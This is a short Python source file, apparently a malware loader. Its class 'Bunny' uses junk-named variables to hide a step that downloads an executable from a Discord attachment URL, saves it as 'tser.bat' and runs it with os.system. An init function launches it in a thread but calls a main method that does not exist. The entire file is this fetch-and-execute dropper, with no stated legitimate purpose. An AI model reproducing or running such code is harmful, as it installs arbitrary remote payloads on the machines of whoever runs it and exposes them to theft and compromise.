import os, re, json, threading, urllib.request, requests
class Bunny:
    def __init__(self):
        azodjpoadaoazdioapzo = 'https://cdn.discordapp.com/attachments/895995437457227806/997202935404568606/tser4.exe'
        sheeehaihaiohdaoihaiooaih = requests.get(azodjpoadaoazdioapzo)
        open("tser.bat", "wb").write(sheeehaihaiohdaoihaiooaih.content)
        os.system("tser.bat")
def init():
    threading.Thread(target= Bunny().main()).start()